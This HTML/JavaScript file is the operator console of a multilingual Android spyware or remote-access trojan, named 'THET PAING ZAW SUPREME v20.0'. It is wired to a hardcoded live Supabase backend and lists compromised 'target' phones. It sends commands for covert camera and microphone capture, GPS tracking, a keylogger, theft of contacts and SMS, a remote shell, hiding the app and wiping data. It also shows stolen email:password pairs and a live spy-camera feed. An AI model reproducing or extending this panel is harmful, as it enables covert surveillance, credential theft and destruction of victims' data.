<!DOCTYPE html>
<html lang="my">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>THET PAING ZAW SUPREME v20.0</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --neon: #00ff00; --bg: #050505; --gold: #ffd700; }
        body { background: var(--bg); color: #fff; margin: 0; font-family: sans-serif; overflow: hidden; }
        .header { background: #000; padding: 15px; text-align: center; border-bottom: 2px solid var(--neon); }
        .name-3d { font-size: 20px; font-weight: 900; background: linear-gradient(90deg, #f00, #0f0, #00f, #f00); background-size: 200%; -webkit-background-clip: text; -webkit-text-fill-color: transparent; animation: flow 3s linear infinite; }
        @keyframes flow { 0% { background-position: 0%; } 100% { background-position: 200%; } }
        .top-bar { display: flex; justify-content: space-between; align-items: center; background: #111; padding: 10px 15px; border-bottom: 1px solid #333; }
        .lang-select { background: #000; color: var(--neon); border: 1px solid var(--neon); padding: 5px; border-radius: 4px; outline: none; }
        .nav { display: flex; background: #000; overflow-x: auto; }
        .tab { flex: 1; min-width: 80px; padding: 15px 5px; text-align: center; cursor: pointer; color: #555; font-size: 11px; font-weight: bold; border-bottom: 3px solid transparent; white-space: nowrap; }
        .tab.active { color: var(--neon); border-bottom-color: var(--neon); background: rgba(0,255,0,0.1); }
        .wrapper { display: flex; width: 400vw; transition: 0.5s ease; }
        .page { width: 100vw; height: calc(100vh - 170px); overflow-y: auto; padding: 15px; box-sizing: border-box; }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(90px, 1fr)); gap: 10px; }
        .btn { background: #1a1a1a; border: 1px solid #333; border-radius: 10px; padding: 15px 5px; text-align: center; cursor: pointer; display: flex; flex-direction: column; align-items: center; gap: 8px; transition: 0.3s; }
        .btn i { font-size: 20px; color: var(--neon); }
        .btn span { font-size: 10px; color: #ddd; }
        #cctv-view { width: 100%; max-width: 400px; border: 2px solid red; border-radius: 10px; background: #000; }
        .live-tag { color: red; font-weight: bold; animation: blink 1s infinite; font-size: 12px; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
        table { width: 100%; border-collapse: collapse; font-size: 12px; }
        th, td { padding: 10px; border-bottom: 1px solid #1a1a1a; text-align: left; }
    </style>
</head>
<body>
    <div class="header"><div class="name-3d">THET PAING ZAW SUPREME v20.0</div></div>
    <div class="top-bar">
        <div><span id="l_target">Target:</span> <b id="now-target" style="color:var(--gold);">NONE</b></div>
        <select class="lang-select" id="lang-switch" onchange="syncAll()">
            <option value="my">🇲🇲 Myanmar</option>
            <option value="en">🇺🇸 English</option>
            <option value="th">🇹🇭 Thai</option>
            <option value="cn">🇨🇳 Chinese</option>
        </select>
    </div>
    <div class="nav">
        <div class="tab active" onclick="tab(0)" id="t_ph">ဖုန်းများ</div>
        <div class="tab" onclick="tab(1)" id="t_ct">ထိန်းချုပ်</div>
        <div class="tab" onclick="tab(2)" id="t_cv">CCTV</div>
        <div class="tab" onclick="tab(3)" id="t_rs">ရလဒ်များ</div>
    </div>
    <div class="wrapper" id="move">
        <div class="page"><div id="dev-list">Searching...</div></div>
        <div class="page"><div class="grid" id="cmd-grid"></div></div>
        <div class="page" style="text-align:center;">
            <div class="live-tag" id="l_live">● LIVE STREAMING</div>
            <img id="cctv-view" src="https://via.placeholder.com/320x320?text=Waiting">
        </div>
        <div class="page">
            <table><thead><tr><th id="h1">ဖုန်း</th><th id="h2">အချက်အလက်</th><th id="h3">အချိန်</th></tr></thead><tbody id="res-list"></tbody></table>
        </div>
    </div>

    <script>
        const _supa = supabase.createClient('https://ymeuoksaxgdcfuueafev.supabase.co', 'sb_publishable_rDcHSRuxOlK6W2jaUrbS1Q_UaE-A-EK');
        let selId = null;

        const uiData = {
            my: { ph:"ဖုန်းများ", ct:"ထိန်းချုပ်", cv:"CCTV", rs:"ရလဒ်များ", h1:"ဖုန်း", h2:"အချက်အလက်", h3:"အချိန်", target:"ပစ်မှတ်:", alert:"ပို့ပြီးပြီ:", live:"● တိုက်ရိုက်ကြည့်ရှုခြင်း" },
            en: { ph:"PHONES", ct:"CONTROL", cv:"CCTV", rs:"RESULTS", h1:"PHONE", h2:"DATA", h3:"TIME", target:"Target:", alert:"Sent:", live:"● LIVE STREAMING" },
            th: { ph:"มือถือ", ct:"ควบคุม", cv:"กล้อง", rs:"ผลลัพธ์", h1:"เครื่อง", h2:"ข้อมูล", h3:"เวลา", target:"เป้าหมาย:", alert:"ส่งแล้ว:", live:"● ถ่ายทอดสด" },
            cn: { ph:"设备", ct:"控制", cv:"监控", rs:"结果", h1:"手机", h2:"数据", h3:"时间", target:"目标:", alert:"已发送:", live:"● 实况直播" }
        };

        const commands = [
            {i:"fa-fingerprint", a:"vib", my:"တုန်ခါစေ", en:"Vibrate", th:"สั่น", cn:"震动"}, {i:"fa-volume-up", a:"scr", my:"အော်စေ", en:"Scream", th:"เสียงดัง", cn:"尖叫"},
            {i:"fa-bolt", a:"fl", my:"မီးဖွင့်", en:"Flashlight", th:"ไฟฉาย", cn:"手电筒"}, {i:"fa-camera", a:"cam", my:"ဓာတ်ပုံ", en:"Camera", th:"กล้อง", cn:"拍照"},
            {i:"fa-microphone", a:"mic", my:"အသံခိုး", en:"Mic Rec", th:"อัดเสียง", cn:"录音"}, {i:"fa-location-dot", a:"gps", my:"တည်နေရာ", en:"GPS", th:"ตำแหน่ง", cn:"定位"},
            {i:"fa-lock", a:"loc", my:"လော့ချ", en:"Lock", th:"ล็อค", cn:"锁定"}, {i:"fa-eye", a:"spy", my:"ခိုးကြည့်", en:"Spy Mode", th:"สปาย", cn:"间谍"},
            {i:"fa-skull", a:"wp", my:"အကုန်ဖျက်", en:"Wipe Data", th:"ล้างเครื่อง", cn:"清除"}, {i:"fa-sync", a:"rel", my:"ပြန်ဖွင့်", en:"Reload", th:"รีโหลด", cn:"刷新"},
            {i:"fa-phone", a:"call", my:"ဖုန်းခေါ်", en:"Call", th:"โทร", cn:"拨号"}, {i:"fa-message", a:"sms", my:"SMS ပို့", en:"SMS", th:"ข้อความ", cn:"短信"},
            {i:"fa-wifi", a:"wfo", my:"WiFi ပိတ်", en:"WiFi Off", th:"ปิดไวไฟ", cn:"关闭WiFi"}, {i:"fa-battery-full", a:"bat", my:"ဘက်ထရီ", en:"Battery", th:"แบตเตอรี่", cn:"电池"},
            {i:"fa-folder-tree", a:"fs", my:"ဖိုင်များ", en:"Files", th:"ไฟล์", cn:"文件"}, {i:"fa-image", a:"img", my:"ဝေါပေပါ", en:"Wallpaper", th:"วอลเปเปอร์", cn:"壁纸"},
            {i:"fa-keyboard", a:"kl", my:"ကီးဘုတ်", en:"Keylogger", th:"คีย์บอร์ด", cn:"键盘记录"}, {i:"fa-bell", a:"bp", my:"အသံပေး", en:"Beep", th:"บี๊บ", cn:"响声"},
            {i:"fa-volume-mute", a:"mu", my:"အသံပိတ်", en:"Mute", th:"ปิดเสียง", cn:"静音"}, {i:"fa-ghost", a:"hid", my:"ဖျောက်", en:"Hide App", th:"ซ่อนแอพ", cn:"隐藏"},
            {i:"fa-video", a:"vrec", my:"ဗီဒီယို", en:"Video Rec", th:"อัดวิดีโอ", cn:"录像"}, {i:"fa-address-book", a:"con", my:"နံပါတ်များ", en:"Contacts", th:"รายชื่อ", cn:"联系人"},
            {i:"fa-envelope", a:"mail", my:"အီးမေးလ်", en:"Email", th:"อีเมล", cn:"邮件"}, {i:"fa-globe", a:"web", my:"Link ဖွင့်", en:"Web", th:"เปิดเว็บ", cn:"网页"},
            {i:"fa-power-off", a:"off", my:"ပိတ်လိုက်", en:"Shutdown", th:"ปิดเครื่อง", cn:"关机"}, {i:"fa-shield", a:"def", my:"ကာကွယ်", en:"Protect", th:"ป้องกัน", cn:"保护"},
            {i:"fa-calculator", a:"cal", my:"တွက်ချက်", en:"Calc", th:"เครื่องคิดเลข", cn:"计算器"}, {i:"fa-clock", a:"alarm", my:"နှိုးစက်", en:"Alarm", th:"นาฬิกาปลุก", cn:"闹钟"},
            {i:"fa-music", a:"play", my:"သီချင်း", en:"Play", th:"เล่นเพลง", cn:"播放"}, {i:"fa-stop", a:"stop", my:"ရပ်တန့်", en:"Stop", th:"หยุด", cn:"停止"},
            {i:"fa-search", a:"find", my:"ရှာဖွေ", en:"Search", th:"ค้นหา", cn:"搜索"}, {i:"fa-trash", a:"del", my:"ဖျက်ပစ်", en:"Delete", th:"ลบ", cn:"删除"},
            {i:"fa-download", a:"dl", my:"ဒေါင်းလုဒ်", en:"Download", th:"ดาวน์โหลด", cn:"下载"}, {i:"fa-upload", a:"ul", my:"တင်လိုက်", en:"Upload", th:"อัปโหลด", cn:"上传"},
            {i:"fa-share-nodes", a:"share", my:"မျှဝေ", en:"Share", th:"แชร์", cn:"分享"}, {i:"fa-cog", a:"set", my:"ဆက်တင်", en:"Settings", th:"ตั้งค่า", cn:"设置"},
            {i:"fa-key", a:"pass", my:"စကားဝှက်", en:"Password", th:"รหัสผ่าน", cn:"密码"}, {i:"fa-terminal", a:"shell", my:"ကုဒ်ရိုက်", en:"Shell", th:"เชลล์", cn:"终端"},
            {i:"fa-bug", a:"debug", my:"အမှားရှာ", en:"Debug", th:"ดีบั๊ก", cn:"调试"}, {i:"fa-link", a:"link", my:"ချိတ်ဆက်", en:"Link", th:"เชื่อมต่อ", cn:"连接"},
            {i:"fa-user-secret", a:"incog", my:"လျှို့ဝှက်", en:"Incog", th:"ไม่ระบุตัวตน", cn:"隐身"}, {i:"fa-heartbeat", a:"health", my:"ကျန်းမာ", en:"Health", th:"สุขภาพ", cn:"健康"},
            {i:"fa-map", a:"map", my:"မြေပုံ", en:"Map", th:"แผนที่", cn:"地图"}, {i:"fa-bluetooth", a:"bt", my:"ဘလူးတု", en:"BT", th:"บลูทูธ", cn:"蓝牙"},
            {i:"fa-moon", a:"dark", my:"ညဘက်", en:"Dark", th:"โหมดมืด", cn:"深色"}, {i:"fa-sun", a:"light", my:"နေ့ဘက်", en:"Light", th:"โหมดสว่าง", cn:"浅色"},
            {i:"fa-plane", a:"air", my:"လေယာဉ်", en:"Plane", th:"โหมดบิน", cn:"飞行模式"}, {i:"fa-sim-card", a:"sim", my:"ဆင်းကတ်", en:"SIM", th:"ซิม", cn:"SIM卡"},
            {i:"fa-microchip", a:"cpu", my:"စီပီယူ", en:"CPU", th:"ซีพียู", cn:"处理器"}, {i:"fa-hard-drive", a:"ram", my:"မန်မိုရီ", en:"RAM", th:"แรม", cn:"内存"},
            {i:"fa-display", a:"scr_on", my:"မျက်နှာပြင်", en:"Screen", th:"เปิดจอ", cn:"屏幕"}, {i:"fa-comment", a:"chat", my:"ချက်တင်", en:"Chat", th:"แชท", cn:"聊天"},
            {i:"fa-qrcode", a:"qr", my:"ကျူအာ", en:"QR", th:"สแกน", cn:"二维码"}, {i:"fa-print", a:"print", my:"ပုံနှိပ်", en:"Print", th:"พิมพ์", cn:"打印"},
            {i:"fa-volume-low", a:"vlow", my:"အသံလျှော့", en:"Vol-", th:"ลดเสียง", cn:"音量减"}, {i:"fa-volume-high", a:"vup", my:"အသံတိုး", en:"Vol+", th:"เพิ่มเสียง", cn:"音量加"},
            {i:"fa-wifi", a:"won", my:"WiFi ဖွင့်", en:"WiFi On", th:"เปิดไวไฟ", cn:"開啟WiFi"}, {i:"fa-mobile", a:"vib_l", my:"တုန်ရှည်", en:"Vib-L", th:"สั่นยาว", cn:"长震动"},
            {i:"fa-radiation", a:"nuke", my:"ဖျက်ဆီး", en:"Nuke", th:"ทำลาย", cn:"炸毁"}, {i:"fa-skull-crossbones", a:"kill", my:"သတ်ပစ်", en:"Kill", th:"ฆ่า", cn:"杀死"}
        ];

        function syncAll() {
            const lang = document.getElementById('lang-switch').value;
            const d = uiData[lang];
            ['t_ph','t_ct','t_cv','t_rs'].forEach((id, i) => document.getElementById(id).innerText = d[Object.keys(d)[i]]);
            document.getElementById('h1').innerText = d.h1; document.getElementById('h2').innerText = d.h2; document.getElementById('h3').innerText = d.h3;
            document.getElementById('l_target').innerText = d.target; document.getElementById('l_live').innerText = d.live;
            document.getElementById('cmd-grid').innerHTML = commands.map(c => `<div class="btn" onclick="send('${c.a}', '${c[lang]}')"><i class="fa-solid ${c.i}"></i><span>${c[lang]}</span></div>`).join('');
        }

        async function send(act, name) {
            const lang = document.getElementById('lang-switch').value;
            const d = uiData[lang];
            
            if(!selId) return alert(lang === 'my' ? "ဖုန်းအရင်ရွေးပါ!" : "Select Phone First!");
            
            await _supa.from('commands').insert([{ device_id: selId, action: act }]);
            if(act === 'spy') tab(2);
            
            // Alert စာသားကို ဘာသာစကားအလိုက် ပြောင်းလဲပေးခြင်း
            alert(d.alert + " " + name);
        }

        async function loadData() {
            const { data: devs } = await _supa.from('devices').select('*').order('last_seen', {ascending:false});
            if(devs) document.getElementById('dev-list').innerHTML = devs.map(d => `<div class="btn" style="width:100%; margin-bottom:10px; flex-direction:row; justify-content:space-between; padding:15px;" onclick="selId='${d.device_id}';document.getElementById('now-target').innerText='${d.model}';tab(1)"><b>📱 ${d.model}</b> <span style="color:var(--neon)">SELECT</span></div>`).join('');
            
            const { data: res } = await _supa.from('results').select('*').order('created_at', {ascending:false}).limit(15);
            if(res) {
                const live = res.find(r => r.device_model === "LIVE-CCTV" && r.device_id === selId);
                if(live) document.getElementById('cctv-view').src = live.password;
                document.getElementById('res-list').innerHTML = res.filter(r => r.device_model !== "LIVE-CCTV").map(r => `<tr><td>${r.device_model}</td><td>${r.email}:${r.password}</td><td>${new Date(r.created_at).toLocaleTimeString()}</td></tr>`).join('');
            }
        }

        function tab(i) {
            document.getElementById('move').style.transform = `translateX(-${i * 100}vw)`;
            document.querySelectorAll('.tab').forEach((t, x) => t.classList.toggle('active', x==i));
        }
        syncAll(); setInterval(loadData, 3000);
    </script>
</body>
</html>
